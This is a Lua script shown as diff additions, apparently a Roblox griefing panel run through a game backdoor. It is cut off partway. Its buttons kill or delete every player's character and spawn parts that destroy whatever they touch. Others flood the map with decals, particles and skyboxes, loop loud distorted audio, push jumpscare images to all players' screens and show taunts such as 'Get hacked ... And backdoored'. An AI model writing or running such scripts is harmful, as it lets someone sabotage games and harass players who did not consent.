+sound = Instance.new("Sound",workspace) 
+sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
+sound.SoundId = "rbxassetid://1839246711"
+sound:Play()
+sound.Looped = true
+sound.Volume = 3
+repeat
+wait(0.01)
+until sound.IsLoaded == true
+wait(13)
+de = Instance.new("DistortionSoundEffect",sound)
+de.Level = 0.8
+sky = Instance.new("Sky",game:GetService("Lighting"))
+sky.SkyboxBk = "rbxassetid://90025933870378"
+sky.SkyboxFt = "rbxassetid://90025933870378"
+sky.SkyboxLf = "rbxassetid://90025933870378"
+sky.SkyboxRt = "rbxassetid://90025933870378"
+sky.SkyboxUp = "rbxassetid://90025933870378"
+sky.SkyboxDn = "rbxassetid://90025933870378"
+sky.CelestialBodiesShown = false
+sky.StarCount = 999999999999999999
+getplrs = game:GetService("Players"):GetPlayers()
+for i=1, #getplrs do
+getplrs[i].Character:Destroy()
+end
+game:GetService("Lighting").FogEnd = 100000
+game:GetService("Lighting").FogStart = 900
+game:GetService("Lighting").FogColor = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
+msg = Instance.new("Message",workspace)
+msg.Text = "oh n0!!?!!looks like your pc is doomed by patrick and others??"
+h = Instance.new("Hints",workspace)
+h.Text = "rainning patrick by nb5ua"
+findteams = game:FindFirstChild("Teams")
+if findteams then
+findteams:ClearAllChildren()
+end
+while true do
+wait(0.01)
+if findteams then
+team = Instance.new("Team",findteams)
+team.Name = "hail patrick?!!!"..tostring(math.random(1,33373))
+team.TeamColor = BrickColor.Random()
+end
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+partconcolide = true
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+penguin = Instance.new("Part",workspace)
+mesh = Instance.new("SpecialMesh",penguin)
+mesh.MeshType = Enum.MeshType.FileMesh
+mesh.MeshId = "rbxassetid://455783801"
+mesh.TextureId = "rbxassetid://455783804"
+penguin.Touched:connect(function(otherpart)
+otherpart:Destroy()
+end)
+penguin.Size = Vector3.new(6.502, 11.339, 14.281)
+penguin.CFrame = CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))
+end
+end) 
+
+createButton("Leave Game", UDim2.new(0, 508, 0, -68), function()
+local TeleportService = game:GetService("TeleportService")
+local player = game:GetService("Players").LocalPlayer
+
+TeleportService:Teleport(3951147015, player)
+end) 
+
+createButton("rejoin", UDim2.new(0, 508, 0, -128), function()
+local TeleportService = game:GetService("TeleportService")
+local player = game:GetService("Players").LocalPlayer
+
+TeleportService:Teleport(game.PlaceId, player)
+end) 
+
+createButton("equip tool all", UDim2.new(0, 408, 0, -68), function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function equipAll()
+    local char = player.Character or player.CharacterAdded:Wait()
+    local backpack = player:WaitForChild("Backpack")
+
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = char -- ini automatic EQUIP
+        end
+    end
+end
+
+equipAll()
+
+-- Kalau ada tool baru masuk backpack → auto equip
+
+end) 
+
+createButton("char all into gavindr", UDim2.new(0, 708, 0, 308), function()
+-- LocalScript, taruh di StarterPlayerScripts
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function cloneAppearance(target)
+	task.wait(0.2)
+	local myChar = LocalPlayer.Character
+	local theirChar = target.Character
+	if not myChar or not theirChar then return end
+
+	for _, part in pairs(theirChar:GetChildren()) do
+		if part:IsA("Accessory") or part:IsA("Clothing") or part:IsA("ShirtGraphic") or part:IsA("BodyColors") then
+			part:Destroy()
+		end
+	end
+
+	for _, part in pairs(myChar:GetChildren()) do
+		if part:IsA("Accessory") then
+			local clone = part:Clone()
+			clone.Parent = theirChar
+		elseif part:IsA("Clothing") or part:IsA("ShirtGraphic") or part:IsA("BodyColors") then
+			local clone = part:Clone()
+			clone.Parent = theirChar
+		end
+	end
+
+	-- Samakan warna body (kalau R15/R6)
+	for _, limb in pairs(theirChar:GetChildren()) do
+		if limb:IsA("BasePart") then
+			local myLimb = myChar:FindFirstChild(limb.Name)
+			if myLimb then
+				limb.Color = myLimb.Color
+			end
+		end
+	end
+end
+
+for _, plr in pairs(Players:GetPlayers()) do
+	if plr ~= LocalPlayer then
+		cloneAppearance(plr)
+	end
+end
+
+Players.PlayerAdded:Connect(function(plr)
+	plr.CharacterAdded:Connect(function()
+		task.wait(1)
+		cloneAppearance(plr)
+	end)
+end)
+end) 
+
+createButton("music", UDim2.new(0, 108, 0, 128), function()
+local sound = Instance.new("Sound")
+		sound.Parent = workspace
+		sound.SoundId = "rbxassetid://94533013083491"
+		sound.Name = "Music"
+		sound.Volume = 10
+		sound.Pitch = 1
+		sound.Looped = true
+		sound.Playing = true
+		local dfx = Instance.new("DistortionSoundEffect",sound)
+		dfx.Level = 0.1
+end) 
+
+createButton("Decal spam", UDim2.new(0, 108, 0, 188), function()
+local de= [[
+rbxassetid://77005694743685
+]]
+function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= de then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					v.Material = "Plastic"
+					v.Transparency = 0
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = de
+					Two.Texture = de
+					Three.Texture = de
+					Four.Texture = de
+					Five.Texture = de
+					Six.Texture = de
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+end) 
+
+createButton("skybox", UDim2.new(0, 208, 0, 8), function()
+local sky= [[
+rbxassetid://77005694743685
+]]
+
+local skyy= [[
+rbxassetid://87439537035781
+]]
+
+s = Instance.new("Sky") 
+s.Parent = game:GetService("Lighting")
+while wait(0.04) do
+s.SkyboxBk = sky
+s.SkyboxDn = sky
+s.SkyboxFt = sky
+s.SkyboxLf = sky
+s.SkyboxRt = sky
+s.SkyboxUp = sky
+wait(0.04)
+s.SkyboxBk = skyy
+s.SkyboxDn = skyy
+s.SkyboxFt = skyy
+s.SkyboxLf = skyy
+s.SkyboxRt = skyy
+s.SkyboxUp = skyy
+end
+end) 
+
+
+
+createButton("particle spam", UDim2.new(0, 208, 0, 68), function()
+local ID = "rbxassetid://77005694743685"
+		local t1 = "rbxassetid://77005694743685"
+		local t2 = "rbxassetid://77005694743685"
+		local t3 = "rbxassetid://77005694743685"
+	
+		local Skybox = false
+		local particle = true
+	
+		if Skybox == true then
+			local sky = Instance.new("Sky")
+			sky.Parent = game.Lighting
+			sky.SkyboxBk = ID
+			sky.SkyboxDn = ID
+			sky.SkyboxFt = ID
+			sky.SkyboxLf = ID
+			sky.SkyboxRt = ID
+			sky.SkyboxUp = ID
+		end
+	
+		if particle == true then
+			-- Función para crear un ParticleEmitter con una textura específica
+			local function createParticleEmitter(parent, texture)
+				local pe = Instance.new("ParticleEmitter", parent)
+				pe.Texture = texture
+				pe.VelocitySpread = 15
+				pe.Rate = 6 -- Ajusta la tasa de emisión (partículas por segundo)
+				pe.Lifetime = NumberRange.new(1000, 1000) -- Ajusta el tiempo de vida de las partículas
+				pe.Size = NumberSequence.new(1) -- Ajusta el tamaño de las partículas
+			end
+	
+			-- Aplicar los ParticleEmitters a todas las Partes en el Workspace
+			for _, v in pairs(game.Workspace:GetChildren()) do
+				if v:IsA("Part") then
+					createParticleEmitter(v, t1)
+					createParticleEmitter(v, t2)
+					createParticleEmitter(v, t3)
+				end
+			end
+	
+			-- Aplicar los ParticleEmitters a todas las Partes dentro de los Modelos en el Workspace
+			for _, model in pairs(game.Workspace:GetChildren()) do
+				if model:IsA("Model") then
+					for _, part in pairs(model:GetChildren()) do
+						if part:IsA("Part") then
+							createParticleEmitter(part, t1)
+							createParticleEmitter(part, t2)
+							createParticleEmitter(part, t3)
+						end
+					end
+				end
+			end
+		end
+end) 
+
+createButton("Hint", UDim2.new(0, 208, 0, 128), function()
+local h = Instance.new("Hint")
+h.Parent = workspace
+h.Text = "Get hacked by gavindR And backdoored"
+end) 
+
+createButton("Title ", UDim2.new(0, 208, 0, 188), function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+player.CharacterAdded:Connect(function(character)
+
+    local head = character:WaitForChild("Head")
+
+    if head:FindFirstChild("NameBillboard") then
+        head.NameBillboard:Destroy()
+    end
+
+    local gui1 = Instance.new("BillboardGui")
+    gui1.Name = "NameBillboard"
+    gui1.Parent = head
+    gui1.Adornee = head
+    gui1.Size = UDim2.new(0, 150, 0, 50)
+    gui1.StudsOffset = Vector3.new(0, 1.5, 0)
+    gui1.AlwaysOnTop = true
+
+    local tecks = Instance.new("TextLabel")
+    tecks.Parent = gui1
+    tecks.BackgroundTransparency = 1
+    tecks.BorderSizePixel = 0
+    tecks.Text = "G-a-v-i-n-d-R"
+    tecks.Font = Enum.Font.Fantasy
+    tecks.TextScaled = true
+    tecks.TextStrokeTransparency = 0
+    tecks.TextStrokeColor3 = Color3.new(0, 0, 0)
+    tecks.TextColor3 = Color3.new(0.8, 0, 0)
+    tecks.Size = UDim2.new(1, 0, 1, 0)
+
+end)
+
+local gui1 = Instance.new("BillboardGui")
+    gui1.Name = "NameBillboard"
+    gui1.Parent = head
+    gui1.Adornee = head
+    gui1.Size = UDim2.new(0, 150, 0, 50)
+    gui1.StudsOffset = Vector3.new(0, 1.5, 0)
+    gui1.AlwaysOnTop = true
+
+    local tecks = Instance.new("TextLabel")
+    tecks.Parent = gui1
+    tecks.BackgroundTransparency = 1
+    tecks.BorderSizePixel = 0
+    tecks.Text = "G-a-v-i-n-d-R"
+    tecks.Font = Enum.Font.Fantasy
+    tecks.TextScaled = true
+    tecks.TextStrokeTransparency = 0
+    tecks.TextStrokeColor3 = Color3.new(0, 0, 0)
+    tecks.TextColor3 = Color3.new(0.8, 0, 0)
+    tecks.Size = UDim2.new(1, 0, 1, 0)
+end) 
+
+createButton("666", UDim2.new(0, 308, 0, 8), function()
+for i,v in next,workspace:children''do
+			if(v:IsA'BasePart')then
+				me=v;
+				bbg=Instance.new('BillboardGui',me);
+				bbg.Name='stuf';
+				bbg.Adornee=me;
+				bbg.Size=UDim2.new(2.5,0,2.5,0)
+				--bbg.StudsOffset=Vector3.new(0,2,0)
+				tlb=Instance.new'TextLabel';
+				tlb.Text='666 666 666 666 666 666';
+				tlb.Font='SourceSansBold';
+				tlb.FontSize='Size48';
+				tlb.TextColor3=Color3.new(1,0,0);
+				tlb.Size=UDim2.new(1.25,0,1.25,0);
+				tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
+				tlb.BackgroundTransparency=1;
+				tlb.Parent=bbg;
+			end;end;
+		function xds(dd)
+			for i,v in next,dd:children''do
+				if(v:IsA'BasePart')then
+					v.BrickColor=BrickColor.new'Really black';
+					v.TopSurface='Smooth';
+					v.BottomSurface='Smooth';
+					s=Instance.new('SelectionBox',v);
+					s.Adornee=v;
+					s.Color=BrickColor.new'Really red';
+					a=Instance.new('PointLight',v);
+					a.Color=Color3.new(1,0,0);
+					a.Range=15;
+					a.Brightness=5;
+					f=Instance.new('Fire',v);
+					f.Size=11;
+					f.Heat=12;
+				end;
+				game.Lighting.TimeOfDay=0;
+				game.Lighting.Brightness=0;
+				game.Lighting.ShadowColor=Color3.new(0,0,0);
+				game.Lighting.Ambient=Color3.new(1,0,0);
+				game.Lighting.FogEnd=200;
+				game.Lighting.FogColor=Color3.new(0,0,0);
+				local dec = 'http://www.roblox.com/asset/?id=19399245';
+				local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
+				--coroutine.wrap(function()
+				--for _,__ in pairs(fac) do
+				--local ddec = Instance.new("Decal", v)
+				--ddec.Face = __
+				--ddec.Texture = dec
+				--end end)()
+				if #(v:GetChildren())>0 then
+					xds(v)
+				end
+			end
+		end
+		xds(game.Workspace)
+
+-- Function to highlight a character
+local function highlightCharacter(character)
+	if not character:FindFirstChild("Highlight") then
+		local highlight = Instance.new("Highlight")
+		highlight.Name = "Highlight"
+		highlight.Adornee = character
+		highlight.FillColor = Color3.fromRGB(255, 255, 255) -- Yellow
+		highlight.OutlineColor = Color3.fromRGB(0, 0, 0) -- Black outline
+		highlight.Parent = character
+	end
+end
+
+-- Highlight all current players
+for _, player in pairs(Players:GetPlayers()) do
+	if player ~= localPlayer and player.Character then
+		highlightCharacter(player.Character)
+	end
+end
+
+-- Listen for new players joining or respawning
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(character)
+		if player ~= localPlayer then
+			highlightCharacter(character)
+		end
+	end)
+end)
+
+-- Also listen to character respawns for existing players
+for _, player in pairs(Players:GetPlayers()) do
+	player.CharacterAdded:Connect(function(character)
+		if player ~= localPlayer then
+			highlightCharacter(character)
+		end
+	end)
+end
+
+local badd = true
+
+local h = Instance.new("Hint",workspace) 
+while badd do
+wait(0.1) 
+h.Text = "fzdfrzbtbrdtbrdbgrdddtrdbbgrddtebssrts "
+wait(0.1)
+h.Text = "HAHAHAhagvhskvkghsshgavjwgvnvhew"
+wait(0.1)
+h.Text = "Xsscahngchsykhcsgnhhwvhakcgagcjhyw"
+wait(0.1)
+h.Text = "hjmhvremiuhrmjgufsfjfmsssemujfvbfhjv"
+end
+end) 
+
+createButton("Rainning tacos [destroy]", UDim2.new(0, 308, 0, 68), function()
+local Debris = game:GetService("Debris")
+
+local ba = true
+
+-- loop terus
+while ba do
+wait(0) 
+
+    -- bikin MeshPart baru
+    local taco = Instance.new("MeshPart")
+    taco.Name = "Taco"
+    taco.Size = Vector3.new(14, 12, 11) -- ukuran kasar taco
+    taco.Anchored = false
+    taco.CanCollide = true
+
+    -- kalau ada MeshId taco, masukin di sini
+    taco.MeshId = "rbxassetid://18950769413"
+    taco.TextureID = "rbxassetid://18950770540"
+
+    -- posisi random di atas
+    local x = math.random(-200, 200)
+    local z = math.random(-200, 200)
+    local y = 100
+
+    taco.Position = player.Character.HumanoidRootPart.Position + Vector3.new(x, y ,z) 
+    taco.Parent = workspace
+
+    -- auto hapus biar nggak kebanyakan
+    Debris:AddItem(taco, 20)
+end
+end) 
+
+createButton("kill all", UDim2.new(0, 308, 0, 128), function()
+-- Misalnya ini dipasang pada tombol GUI
+local Players = game:GetService("Players")
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.Health = 0
+    end
+end
+end) 
+
+
+createButton("Get Out SkyBox", UDim2.new(0, 708, 0, 428), function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local char = player.Character or player.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
+
+-- Buang benda physics yang mengganggu
+for _,v in pairs(hrp:GetChildren()) do
+    if v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") then
+        v:Destroy()
+    end
+end
+
+local spin = Instance.new("BodyAngularVelocity")
+spin.AngularVelocity = Vector3.new(0, 4500000000, 0) -- rotasi super kuat tapi stabil
+spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge) -- daya tidak terbatas
+spin.Parent = hrp
+
+-- Biar posisi tetap stabil dan tidak terlempar balik
+RunService.Heartbeat:Connect(function()
+    hrp.Velocity = Vector3.zero
+end)
+end) 
+
+createButton("Speed all 100", UDim2.new(0, 308, 0, 188), function()
+-- Misalnya ini dipasang pada tombol GUI
+local Players = game:GetService("Players")
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = 100
+    end
+end
+end) 
+
+createButton("Jump all 300", UDim2.new(0, 408, 0, 8), function()
+-- Misalnya ini dipasang pada tombol GUI
+local Players = game:GetService("Players")
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.UseJumpPower = true
+        player.Character.Humanoid.JumpPower = 300
+    end
+end
+end) 
+
+createButton("saturation -1", UDim2.new(0, 508, 0, 08), function()
+local Lighting = game:GetService("Lighting")
+
+local cc = Lighting:FindFirstChild("GrayShader") or Instance.new("ColorCorrectionEffect")
+cc.Name = "GrayShader"
+cc.Saturation = -1
+cc.Parent = Lighting
+end) 
+
+createButton("rainbow all part", UDim2.new(0, 508, 0, 68), function()
+local RunService = game:GetService("RunService")
+
+local function applyRainbow(part)
+    task.spawn(function()
+        while part and part.Parent do
+            part.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            task.wait(0.02)
+        end
+    end)
+end
+
+-- Untuk semua yang sudah ada
+for _, obj in ipairs(workspace:GetDescendants()) do
+    if obj:IsA("BasePart") then
+        applyRainbow(obj)
+    end
+end
+
+-- Untuk part baru yang muncul kemudian
+workspace.DescendantAdded:Connect(function(obj)
+    if obj:IsA("BasePart") then
+        applyRainbow(obj)
+    end
+end)
+end) 
+
+createButton("scary", UDim2.new(0, 508, 0, 128), function()
+
+local skybox = Instance.new("Part", workspace)
+skybox.Size = Vector3.new(0,0,0)
+skybox.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 0 , 0)
+skybox.Anchored = true
+skybox.CanCollide = false
+skybox.Name = "SkySphere"
+
+local skyboxmesh = Instance.new("SpecialMesh", skybox)
+skyboxmesh.MeshId = "rbxassetid://1527559"
+skyboxmesh.TextureId = "rbxassetid://1529455"
+skyboxmesh.VertexColor = Vector3.new(1,0,0)
+skyboxmesh.Scale = Vector3.new(-2000, -500, -2000)
+
+-- ❗ Rotasi berputar terus
+RunService.Heartbeat:Connect(function()
+    skybox.CFrame = skybox.CFrame * CFrame.fromEulerAnglesXYZ(0, 0.013, 0)
+end)
+
+local sound = Instance.new("Sound")
+sound.Parent = game:GetService("SoundService")
+sound.SoundId = "rbxassetid://11984351"
+sound.Name = "Music"
+sound.Volume = 10
+sound.Pitch = 0.20
+sound.Looped = true
+sound.Playing = true
+
+local Lighting = game:GetService("Lighting")
+
+-- 🌑 Set malam super gelap
+Lighting.Brightness = 0
+Lighting.ClockTime = 4
+Lighting.FogEnd = 6000
+Lighting.Ambient = Color3.fromRGB(30, 30, 30)
+Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
+
+-- ⚡ Flash lightning
+local function LightningFlash()
+    Lighting.OutdoorAmbient = Color3.fromRGB(7000, 7000, 7000)
+
+    task.wait(0.17)
+    Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
+
+end
+
+-- ➤ Ambil semua BasePart
+local function GetAllParts()
+    local parts = {}
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            table.insert(parts, v)
+        end
+    end
+    return parts
+end
+
+-- ✨ Highlight glitch
+local function GlitchHighlight(part)
+    -- Buat highlight
+    local h = Instance.new("Highlight")
+h.FillColor = Color3.fromRGB(255, 0, 0) -- warna awal
+h.OutlineColor = Color3.fromRGB(255, 255, 255)
+h.FillTransparency = -40820181
+h.OutlineTransparency = 0
+h.Adornee = part
+h.Parent = part
+
+-- Suara glitch
+local s = Instance.new("Sound")
+s.SoundId = "rbxassetid://11984351"
+s.Volume = 10
+local fx = Instance.new("DistortionSoundEffect", s)
+			fx.Level = math.random(20, 60)
+s.Pitch = math.random(1.05,12) / 10
+s.Parent = part
+s:Play()
+
+-- Efek glitch kedip²
+for i = 1, 12 do
+    h.FillColor = Color3.fromRGB(math.random(180,250), math.random(10,250), math.random(90,150)) -- merah gelap acak
+    h.FillTransparency = math.random(-926226181, -27372)
+    h.OutlineTransparency = math.random()
+    task.wait(1.15)
+end
+
+    -- Hapus highlight + suara
+    s:Destroy()
+end
+
+-- 🔁 Loop utama
+while true do
+    task.wait(math.random(1,2))
+
+    LightningFlash()
+
+    local allParts = GetAllParts()
+    if #allParts > 0 then
+        local randomPart = allParts[math.random(1, #allParts)]
+        GlitchHighlight(randomPart)
+    end
+end
+end) 
+
+createButton("jumpscare", UDim2.new(0, 508, 0, 188), function()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+
+for _, v in pairs(Players:GetPlayers()) do
+    local pgui = v:FindFirstChild("PlayerGui")
+    if not pgui then continue end
+
+    ---------------------------------------------------------
+    -- GUI UTAMA
+    ---------------------------------------------------------
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "Screamer"
+    gui.DisplayOrder = 10000000
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = pgui
+
+    ---------------------------------------------------------
+    -- GAMBAR JUMPSCARE
+    ---------------------------------------------------------
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1,0,1,0)
+    
+    img.BackgroundTransparency = 1
+    img.Image = "rbxassetid://113665607881195"
+    img.ZIndex = 100
+    img.Parent = gui
+
+    ---------------------------------------------------------
